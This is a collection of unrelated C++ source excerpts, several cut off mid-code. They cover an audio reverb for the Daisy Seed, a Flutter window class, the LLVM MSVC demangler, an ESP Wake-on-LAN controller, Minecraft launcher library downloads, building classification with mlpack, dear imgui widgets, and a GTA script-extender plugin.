    "#include \"daisysp.h\"\n#include \"daisy_seed.h\"\n\n// Interleaved audio definitions\n#define LEFT (i)\n#define RIGHT (i + 1)\n\nusing namespace daisysp;\nusing namespace daisy;\n\nstatic DaisySeed hw;\n\n// Number of delay lines\n#define DEL_NUM 4U\n\n// Declare FDN DelayLines\nstatic DelayLine<float, 4999U + 1U> FDN_del[DEL_NUM];\n\n// Declare LPF DelayLines\nstatic DelayLine<float, 1U> lpf_del[DEL_NUM];\n\n// Declare APF DelayLines\nstatic DelayLine<float, 557U + 1U> apf_del[DEL_NUM];\n\n// FDN feedback matrix - 4x4\nconst signed char hadamard_matrix[DEL_NUM][DEL_NUM] = {\n{  1,  1,  1,  1  },\n{ -1,  1, -1,  1  },\n{ -1, -1,  1,  1  },\n{  1, -1, -1,  1  }\n};\n\n// Matrix scalar for Hadamard\n#define MATRIX_SCALAR 0.5f\n\n// Number of primes\n#define PRIMES_NUM 669\n\nconst unsigned short primes[PRIMES_NUM] = {\n2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,563,569,571,577,587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,673,677,683,691,701,709,719,727,733,739,743,751,757,761,769,773,787,797,809,811,821,823,827,829,839,853,857,859,863,877,881,883,887,907,911,919,929,937,941,947,953,967,971,977,983,991,\n997,1009,1013,1019,1021,1031,1033,1039,1049,1051,1061,1063,1069,1087,1091,1093,1097,1103,1109,1117,1123,1129,1151,1153,1163,1171,1181,1187,1193,1201,1213,1217,1223,1229,1231,1237,1249,1259,1277,1279,1283,1289,1291,1297,1301,1303,1307,1319,1321,1327,1361,1367,1373,1381,1399,1409,1423,1427,1429,1433,1439,1447,1451,1453,1459,1471,1481,1483,1487,1489,1493,1499,1511,1523,1531,1543,1549,1553,1559,1567,1571,1579,1583,1597,1601,1607,1609,1613,1619,1621,1627,1637,1657,1663,1667,1669,1693,1697,1699,1709,1721,1723,1733,1741,1747,1753,1759,1777,1783,1787,1789,1801,1811,1823,1831,1847,1861,1867,1871,1873,1877,1879,1889,1901,1907,1913,1931,1933,\n1949,1951,1973,1979,1987,1993,1997,1999,2003,2011,2017,2027,2029,2039,2053,2063,2069,2081,2083,2087,2089,2099,2111,2113,2129,2131,2137,2141,2143,2153,2161,2179,2203,2207,2213,2221,2237,2239,2243,2251,2267,2269,2273,2281,2287,2293,2297,2309,2311,2333,2339,2341,2347,2351,2357,2371,2377,2381,2383,2389,2393,2399,2411,2417,2423,2437,2441,2447,2459,2467,2473,2477,2503,2521,2531,2539,2543,2549,2551,2557,2579,2591,2593,2609,2617,2621,2633,2647,2657,2659,2663,2671,2677,2683,2687,2689,2693,2699,2707,2711,2713,2719,2729,2731,2741,2749,2753,2767,2777,2789,2791,2797,2801,2803,2819,2833,2837,2843,2851,2857,2861,2879,2887,2897,2903,2909,2917,2927,\n2939,2953,2957,2963,2969,2971,2999,3001,3011,3019,3023,3037,3041,3049,3061,3067,3079,3083,3089,3109,3119,3121,3137,3163,3167,3169,3181,3187,3191,3203,3209,3217,3221,3229,3251,3253,3257,3259,3271,3299,3301,3307,3313,3319,3323,3329,3331,3343,3347,3359,3361,3371,3373,3389,3391,3407,3413,3433,3449,3457,3461,3463,3467,3469,3491,3499,3511,3517,3527,3529,3533,3539,3541,3547,3557,3559,3571,3581,3583,3593,3607,3613,3617,3623,3631,3637,3643,3659,3671,3673,3677,3691,3697,3701,3709,3719,3727,3733,3739,3761,3767,3769,3779,3793,3797,3803,3821,3823,3833,3847,3851,3853,3863,3877,3881,3889,3907,3911,3917,3919,3923,3929,3931,3943,3947,3967,3989,4001,\n4003,4007,4013,4019,4021,4027,4049,4051,4057,4073,4079,4091,4093,4099,4111,4127,4129,4133,4139,4153,4157,4159,4177,4201,4211,4217,4219,4229,4231,4241,4243,4253,4259,4261,4271,4273,4283,4289,4297,4327,4337,4339,4349,4357,4363,4373,4391,4397,4409,4421,4423,4441,4447,4451,4457,4463,4481,4483,4493,4507,4513,4517,4519,4523,4547,4549,4561,4567,4583,4591,4597,4603,4621,4637,4639,4643,4649,4651,4657,4663,4673,4679,4691,4703,4721,4723,4729,4733,4751,4759,4783,4787,4789,4793,4799,4801,4813,4817,4831,4861,4871,4877,4889,4903,4909,4919,4931,4933,4937,4943,4951,4957,4967,4969,4973,4987,4993,4999\n};\n\nunsigned int selectedPrimes[DEL_NUM];\n\n// G gains\nfloat g[DEL_NUM] = {0.805f, 0.827f, 0.783f, 0.764f};\n\nfloat u, sig_out;\nfloat lpf_y[DEL_NUM];\nfloat apf_del_out, apf_feedback, apf_y; //[DEL_NUM];\nfloat FDN_del_out[DEL_NUM]; // delay outs\nfloat FDN_feedback;\nunsigned char idx, r, c; // for-loop variables\n\nfloat wetCV;\nfloat lengthCV;\nfloat densityCV;\n\n\nstatic void AudioCallback(AudioHandle::InterleavingInputBuffer  in,\n                          AudioHandle::InterleavingOutputBuffer out,\n                          size_t                                size)\n{\n\n    for(size_t i = 0; i < size; i += 2)\n    {\n\n        u = 0.5f * (in[LEFT] + in[RIGHT]); // mono input\n\n        // Process delay outs and output signal\n        sig_out = 0.0f;\n        for(idx = 0; idx < DEL_NUM; idx++){\n            FDN_del_out[idx] = FDN_del[idx].Read();\n            sig_out += FDN_del_out[idx] / 4.0f;\n\n\t\t\t// LPF\n            lpf_y[idx] = (0.8f * FDN_del_out[idx]) + (0.2f * lpf_del[idx].Read());\n            lpf_del[idx].Write(lpf_y[idx]);\n\n\t\t\t// APF\n\t\t\t//apf_del_out = apf",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "//===- MicrosoftDemangle.cpp ----------------------------------------------===//\n//\n// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n//\n// This file defines a demangler for MSVC-style mangled symbols.\n//\n// This file has no dependencies on the rest of LLVM so that it can be\n// easily reused in other programs such as libcxxabi.\n//\n//===----------------------------------------------------------------------===//\n\n#include \"MicrosoftDemangle.h\"\n\n#include \"Demangle.h\"\n#include \"DemangleConfig.h\"\n#include \"MicrosoftDemangleNodes.h\"\n#include \"StringViewExtras.h\"\n#include \"Utility.h\"\n\n#include <array>\n#include <cctype>\n#include <cstdio>\n#include <string_view>\n#include <tuple>\n\nusing namespace llvm;\nusing namespace ms_demangle;\n\nstatic bool startsWithDigit(std::string_view S) {\n  return !S.empty() && std::isdigit(S.front());\n}\n\nstruct NodeList {\n  Node *N = nullptr;\n  NodeList *Next = nullptr;\n};\n\nstatic bool consumeFront(std::string_view &S, char C) {\n  if (!llvm::itanium_demangle::starts_with(S, C))\n    return false;\n  S.remove_prefix(1);\n  return true;\n}\n\nstatic bool consumeFront(std::string_view &S, std::string_view C) {\n  if (!llvm::itanium_demangle::starts_with(S, C))\n    return false;\n  S.remove_prefix(C.size());\n  return true;\n}\n\nstatic bool isMemberPointer(std::string_view MangledName, bool &Error) {\n  Error = false;\n  const char F = MangledName.front();\n  MangledName.remove_prefix(1);\n  switch (F) {\n  case '$':\n    // This is probably an rvalue reference (e.g. $$Q), and you cannot have an\n    // rvalue reference to a member.\n    return false;\n  case 'A':\n    // 'A' indicates a reference, and you cannot have a reference to a member\n    // function or member.\n    return false;\n  case 'P':\n  case 'Q':\n  case 'R':\n  case 'S':\n    // These 4 values indicate some kind of pointer, but we still don't know\n    // what.\n    break;\n  default:\n    // isMemberPointer() is called only if isPointerType() returns true,\n    // and it rejects other prefixes.\n    DEMANGLE_UNREACHABLE;\n  }\n\n  // If it starts with a number, then 6 indicates a non-member function\n  // pointer, and 8 indicates a member function pointer.\n  if (startsWithDigit(MangledName)) {\n    if (MangledName[0] != '6' && MangledName[0] != '8') {\n      Error = true;\n      return false;\n    }\n    return (MangledName[0] == '8');\n  }\n\n  // Remove ext qualifiers since those can appear on either type and are\n  // therefore not indicative.\n  consumeFront(MangledName, 'E'); // 64-bit\n  consumeFront(MangledName, 'I'); // restrict\n  consumeFront(MangledName, 'F'); // unaligned\n\n  if (MangledName.empty()) {\n    Error = true;\n    return false;\n  }\n\n  // The next value should be either ABCD (non-member) or QRST (member).\n  switch (MangledName.front()) {\n  case 'A':\n  case 'B':\n  case 'C':\n  case 'D':\n    return false;\n  case 'Q':\n  case 'R':\n  case 'S':\n  case 'T':\n    return true;\n  default:\n    Error = true;\n    return false;\n  }\n}\n\nstatic SpecialIntrinsicKind\nconsumeSpecialIntrinsicKind(std::string_view &MangledName) {\n  if (consumeFront(MangledName, \"?_7\"))\n    return SpecialIntrinsicKind::Vftable;\n  if (consumeFront(MangledName, \"?_8\"))\n    return SpecialIntrinsicKind::Vbtable;\n  if (consumeFront(MangledName, \"?_9\"))\n    return SpecialIntrinsicKind::VcallThunk;\n  if (consumeFront(MangledName, \"?_A\"))\n    return SpecialIntrinsicKind::Typeof;\n  if (consumeFront(MangledName, \"?_B\"))\n    return SpecialIntrinsicKind::LocalStaticGuard;\n  if (consumeFront(MangledName, \"?_C\"))\n    return SpecialIntrinsicKind::StringLiteralSymbol;\n  if (consumeFront(MangledName, \"?_P\"))\n    return SpecialIntrinsicKind::UdtReturning;\n  if (consumeFront(MangledName, \"?_R0\"))\n    return SpecialIntrinsicKind::RttiTypeDescriptor;\n  if (consumeFront(MangledName, \"?_R1\"))\n    return SpecialIntrinsicKind::RttiBaseClassDescriptor;\n  if (consumeFront(MangledName, \"?_R2\"))\n    return SpecialIntrinsicKind::RttiBaseClassArray;\n  if (consumeFront(MangledName, \"?_R3\"))\n    return SpecialIntrinsicKind::RttiClassHierarchyDescriptor;\n  if (consumeFront(MangledName, \"?_R4\"))\n    return SpecialIntrinsicKind::RttiCompleteObjLocator;\n  if (consumeFront(MangledName, \"?_S\"))\n    return SpecialIntrinsicKind::LocalVftable;\n  if (consumeFront(MangledName, \"?__E\"))\n    return SpecialIntrinsicKind::DynamicInitializer;\n  if (consumeFront(MangledName, \"?__F\"))\n    return SpecialIntrinsicKind::DynamicAtexitDestructor;\n  if (consumeFront(MangledName, \"?__J\"))\n    return SpecialIntrinsicKind::LocalStaticThreadGuard;\n  return SpecialIntrinsicKind::None;\n}\n\nstatic bool startsWithLocalScopePattern(std::string_view S) {\n  if (!consumeFront(S, '?'))\n    return false;\n\n  size_t End = S.find('?');\n  if (End == std::string_view::npos)\n    return false;\n  std::string_view Candidate = S.substr(0, End);\n  ",
    "#include \"bemfa_client.hpp\"\n#include \"WakeOnLan.h\"\n#include \"wifi_helper.hpp\"\n\nBemfaClient* bemfaClient;\nWifiHelper* wifiHelper;\n\nWiFiUDP UDP;\nWakeOnLan WOL(UDP);\n\nconst int LED_Pin = 2;\n\nconst char *SSID = \"xxxx\";  // wifi\u540d\u79f0\nconst char *PSW = \"xxxx\";  // wifi\u5bc6\u7801\n\nconst char *UID = \"xxxx\";  // \u5df4\u6cd5\u4e91\u7684UID\nconst char *TOPIC = \"xxxx\";  // \u5df4\u6cd5\u4e91\u4e2d\u521b\u5efa\u7684TOPIC(\u4e0d\u662f\u6635\u79f0)\n\nconst char *TARGET_MAC_ADDR = \"xx:xx:xx:xx:xx:xx\";  // \u8981\u542f\u52a8\u7684\u7535\u8111\u7684MAC\u5730\u5740\n\nvoid blinkTwice() {\n    digitalWrite(LED_Pin, HIGH);\n    delay(200);\n    digitalWrite(LED_Pin, LOW);\n    delay(200);\n    digitalWrite(LED_Pin, HIGH);\n    delay(200);\n    digitalWrite(LED_Pin, LOW);\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    Serial.println(\"Beginning...\");\n    wifiHelper = new WifiHelper(SSID, PSW, LED_Pin);\n    bemfaClient = new BemfaClient(UID, TOPIC);\n    bemfaClient->addCommand(\"on\", []{\n        Serial.println(\"Send magic packet\");\n        WOL.setRepeat(3, 100);\n        WOL.calculateBroadcastAddress(WiFi.localIP(), WiFi.subnetMask());\n        WOL.sendMagicPacket(TARGET_MAC_ADDR);\n        blinkTwice();\n    });\n}\n\nvoid loop() {\n    wifiHelper->tick();\n    bemfaClient->tick();\n}",
    "// SPDX-License-Identifier: GPL-3.0-only\n/*\n *  Prism Launcher - Minecraft Launcher\n *  Copyright (C) 2022 Sefa Eyeoglu <contact@scrumplex.net>\n *\n *  This program is free software: you can redistribute it and/or modify\n *  it under the terms of the GNU General Public License as published by\n *  the Free Software Foundation, version 3.\n *\n *  This program is distributed in the hope that it will be useful,\n *  but WITHOUT ANY WARRANTY; without even the implied warranty of\n *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n *  GNU General Public License for more details.\n *\n *  You should have received a copy of the GNU General Public License\n *  along with this program.  If not, see <https://www.gnu.org/licenses/>.\n *\n * This file incorporates work covered by the following copyright and\n * permission notice:\n *\n *      Copyright 2013-2021 MultiMC Contributors\n *\n *      Licensed under the Apache License, Version 2.0 (the \"License\");\n *      you may not use this file except in compliance with the License.\n *      You may obtain a copy of the License at\n *\n *          http://www.apache.org/licenses/LICENSE-2.0\n *\n *      Unless required by applicable law or agreed to in writing, software\n *      distributed under the License is distributed on an \"AS IS\" BASIS,\n *      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *      See the License for the specific language governing permissions and\n *      limitations under the License.\n */\n\n#include \"Library.h\"\n#include \"MinecraftInstance.h\"\n\n#include <BuildConfig.h>\n#include <FileSystem.h>\n#include <net/ApiDownload.h>\n#include <net/ChecksumValidator.h>\n\nvoid Library::getApplicableFiles(const RuntimeContext& runtimeContext,\n                                 QStringList& jar,\n                                 QStringList& native,\n                                 QStringList& native32,\n                                 QStringList& native64,\n                                 const QString& overridePath) const\n{\n    bool local = isLocal();\n    auto actualPath = [&](QString relPath) {\n        QFileInfo out(FS::PathCombine(storagePrefix(), relPath));\n        if (local && !overridePath.isEmpty()) {\n            QString fileName = out.fileName();\n            return QFileInfo(FS::PathCombine(overridePath, fileName)).absoluteFilePath();\n        }\n        return out.absoluteFilePath();\n    };\n    QString raw_storage = storageSuffix(runtimeContext);\n    if (isNative()) {\n        if (raw_storage.contains(\"${arch}\")) {\n            auto nat32Storage = raw_storage;\n            nat32Storage.replace(\"${arch}\", \"32\");\n            auto nat64Storage = raw_storage;\n            nat64Storage.replace(\"${arch}\", \"64\");\n            native32 += actualPath(nat32Storage);\n            native64 += actualPath(nat64Storage);\n        } else {\n            native += actualPath(raw_storage);\n        }\n    } else {\n        jar += actualPath(raw_storage);\n    }\n}\n\nQList<NetAction::Ptr> Library::getDownloads(const RuntimeContext& runtimeContext,\n                                            class HttpMetaCache* cache,\n                                            QStringList& failedLocalFiles,\n                                            const QString& overridePath) const\n{\n    QList<NetAction::Ptr> out;\n    bool stale = isAlwaysStale();\n    bool local = isLocal();\n\n    auto check_local_file = [&](QString storage) {\n        QFileInfo fileinfo(storage);\n        QString fileName = fileinfo.fileName();\n        auto fullPath = FS::PathCombine(overridePath, fileName);\n        QFileInfo localFileInfo(fullPath);\n        if (!localFileInfo.exists()) {\n            failedLocalFiles.append(localFileInfo.filePath());\n            return false;\n        }\n        return true;\n    };\n\n    auto add_download = [&](QString storage, QString url, QString sha1) {\n        if (local) {\n            return check_local_file(storage);\n        }\n        auto entry = cache->resolveEntry(\"libraries\", storage);\n        if (stale) {\n            entry->setStale(true);\n        }\n        if (!entry->isStale())\n            return true;\n        Net::Download::Options options;\n        if (stale) {\n            options |= Net::Download::Option::AcceptLocalFiles;\n        }\n\n        // Don't add a time limit for the libraries cache entry validity\n        options |= Net::Download::Option::MakeEternal;\n\n        if (sha1.size()) {\n            auto rawSha1 = QByteArray::fromHex(sha1.toLatin1());\n            auto dl = Net::ApiDownload::makeCached(url, entry, options);\n            dl->addValidator(new Net::ChecksumValidator(QCryptographicHash::Sha1, rawSha1));\n            qDebug() << \"Checksummed Download for:\" << rawName().serialize() << \"storage:\" << storage << \"url:\" << url;\n            out.append(dl);\n        } else {\n            out.append(Net::ApiDownload::makeCached(url, entry, options));\n            qDebug() << \"Download for:\" << rawName().serialize() << \"storage:\" << storage << \"url:\" << url;\n        }\n        return",
    "#include <iostream>\n#include <vector>\n#include <tuple>\n#include <cmath>\n#include <string>\n#include <functional>\n#include <algorithm>\n#include <unordered_map>\n#include <mutex>\n#include <atomic>\n#include <memory>\n#include <chrono>\n#include <numeric>\n#include <thread>\n#include <unordered_set>\n#include <random>\n\n#include <mlpack.hpp>\n\n#include \"ogrsf_frmts.h\"\n#include <ogr_geometry.h>\n#include \"classifications.hpp\"\n\n// namespace fs = std::filesystem;\n\n// classification\n\nvoid cl::Cl_bild::logistic_factory(std::unique_ptr<preparation::Buildings>& prepared_bds, std::unique_ptr<preparation::Buildings>& without_factories,\n        std::unique_ptr<cl::Cl_bild>& final_data){\n    v_doub cat_from_genplan;\n    v_doub cat_simpl;\n    v_doub amen_d = prepared_bds->amenities_density;\n    v_doub center_d = prepared_bds->distance_to_center;\n\n    for (std::string icateg:prepared_bds->symplified_categ){\n        if (icateg == \"detached_h\"){\n            cat_simpl.push_back(static_cast<double>(0));\n        } else if (icateg == \"multi_h\"){\n            cat_simpl.push_back(static_cast<double>(0));\n        } else if (icateg == \"commerical\"){\n            cat_simpl.push_back(static_cast<double>(0));\n        } else if (icateg == \"factory\"){\n            cat_simpl.push_back(static_cast<double>(1));\n        } else {\n            cat_simpl.push_back(static_cast<double>(2));\n        }\n    }\n\n    for (std::string gen_categ:prepared_bds->genplan_categ){\n        if (gen_categ == \"res_low\"){\n            cat_from_genplan.push_back(static_cast<double>(0));\n        } else if (gen_categ == \"res_4_9\"){\n            cat_from_genplan.push_back(static_cast<double>(0));\n        } else if (gen_categ == \"res_9plus\"){\n            cat_from_genplan.push_back(static_cast<double>(0));\n        } else if (gen_categ == \"office\"){\n            cat_from_genplan.push_back(static_cast<double>(0));\n        } else if (gen_categ == \"factory\"){\n            cat_from_genplan.push_back(static_cast<double>(1));\n        } else {\n            cat_from_genplan.push_back(static_cast<double>(2));\n        }\n    }\n\n    v_doub train_gen;\n    v_doub train_simpl;\n    v_doub train_amenity;\n    v_doub train_center;\n    std::vector<size_t> lbls;\n    v_longlong train_id;\n\n    v_doub test_gen;\n    v_doub test_simpl;\n    v_doub test_amenity;\n    v_doub test_center;\n    v_longlong test_id;\n\n    if ((cat_from_genplan.size() == cat_simpl.size()) && (amen_d.size() == center_d.size())){\n        for (unsigned long i = 0; i != cat_from_genplan.size(); i++){\n\n            if ((cat_simpl.at(i) == static_cast<double>(1)) && (cat_from_genplan.at(i) == static_cast<double>(1))){\n\n                train_gen.push_back(cat_from_genplan.at(i));\n                train_simpl.push_back(cat_simpl.at(i));\n                train_amenity.push_back(amen_d.at(i));\n                train_center.push_back(center_d.at(i));\n                train_id.push_back(prepared_bds->osm_id_vec.at(i));\n                // Create factory objects in cl class\n                \n                OGRPoint centroid_1;\n                prepared_bds->ogr_poly_vec.at(i).Centroid(&centroid_1);\n                point_vector.push_back(centroid_1);\n                category.push_back(\"factory\");\n                levels.push_back(prepared_bds->levels.at(i));\n                area.push_back(prepared_bds->square_vec.at(i));\n                relative_density.push_back(prepared_bds->relative_density.at(i));\n\n                lbls.push_back(static_cast<size_t>(1));\n\n            } else if ((cat_simpl.at(i) == static_cast<double>(0)) && (cat_from_genplan.at(i) == static_cast<double>(0)) \n                                                                    && (prepared_bds->genplan_categ.at(i) != \"res_low\")){\n\n                train_gen.push_back(cat_from_genplan.at(i));\n                train_simpl.push_back(cat_simpl.at(i));\n                train_amenity.push_back(amen_d.at(i));\n                train_center.push_back(center_d.at(i));\n                train_id.push_back(prepared_bds->osm_id_vec.at(i));\n                lbls.push_back(static_cast<size_t>(0));\n                // Create non factory object in class to continue classify\n\n                without_factories->amenities_density.push_back(prepared_bds->amenities_density.at(i));\n                without_factories->bc_buildings.push_back(prepared_bds->bc_buildings.at(i));\n                without_factories->building_type_vec.push_back(prepared_bds->building_type_vec.at(i));\n                without_factories->cc_buildings.push_back(prepared_bds->cc_buildings.at(i));\n                without_factories->distance_to_center.push_back(prepared_bds->distance_to_center.at(i));\n                without_factories->genplan_categ.push_back(prepared_bds->genplan_categ.at(i));\n                without_factories->levels.push_back(prepared_bds->levels.at(i));\n                without_factories->ogr_poly_vec.push_back(prepared_bds->ogr_poly_vec.at(i));\n                without_factories->osm_id_vec.push_back(prepared_bds->osm_id_vec.at(i));\n\n        ",
    "// dear imgui, v1.90.6\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: Typing-Select support\n// [SECTION] Widgets: Multi-Select support\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n\n// System includes\n#include <stdint.h>     // intptr_t\n\n//-------------------------------------------------------------------------\n// Warnings\n//-------------------------------------------------------------------------\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#pragma clang diagnostic ignored \"-Wunsafe-buffer-usage\"            // warning: 'xxx' is an unsafe pointer used for buffer access\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                          // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"       ",
    "#include \"plugin.h\"\n#include \"CRunningScript.h\"\n#include \"CTheScripts.h\"\n#include \"CMessages.h\"\n//#include \"ScmExtenderAPI.h\"\n\nclass ScmExtender {\npublic: \n    static inline std::unordered_map<int32_t, int8_t(*)(int32_t*)> mapOfNewOpcodes = {};\n\n    static __declspec(dllexport) void AddOneCommand(int32_t command, int8_t(*func)(int32_t*)) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end())\n            std::cout << \"[SCRIPT] Command id \" << command << \" overwritten\" << std::endl;\n\n        mapOfNewOpcodes[command] = func;\n    }\n\n    static inline CRunningScript* currentScript = nullptr;\n    static __declspec(dllexport) void CollectParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->CollectParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void StoreParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->StoreParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void UpdateCompareFlag(uint8_t flag) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->UpdateCompareFlag(flag);\n    }\n\n    static int8_t ProcessOneCommand(CRunningScript* script) {\n        ++CTheScripts::CommandsExecuted;\n\n        int32_t m_nPrevIp = script->m_nIp;\n        int32_t command = CTheScripts::ScriptSpace[script->m_nIp + 1] << 8 | CTheScripts::ScriptSpace[script->m_nIp];\n        script->m_nIp += sizeof(uint16_t);\n        script->m_bNotFlag = (command & 0x8000);\n        command &= 0x7FFF;\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end()) {\n            currentScript = script;\n            tScriptParam* params = CTheScripts::ScriptParams;\n            return f->second((int32_t*)params);\n        }\n\n        script->m_nIp = m_nPrevIp;\n        --CTheScripts::CommandsExecuted;\n\n        return script->ProcessOneCommand();\n    }\n\n    ScmExtender() {\n        plugin::Events::initRwEvent += []() {\n            CTheScripts::ScriptSpace = plugin::patch::Get<uint8_t*>(0x4387A0 + 3);\n        };\n\n        auto processScriptHook = [](CRunningScript* script, void*) {\n            if (script->m_bUseMissionCleanup)\n                script->DoDeathArrestCheck();\n\n            if (script->m_bIsMission && CTheScripts::FailCurrentMission == 1 && script->m_nSP == 1)\n                script->m_nIp = 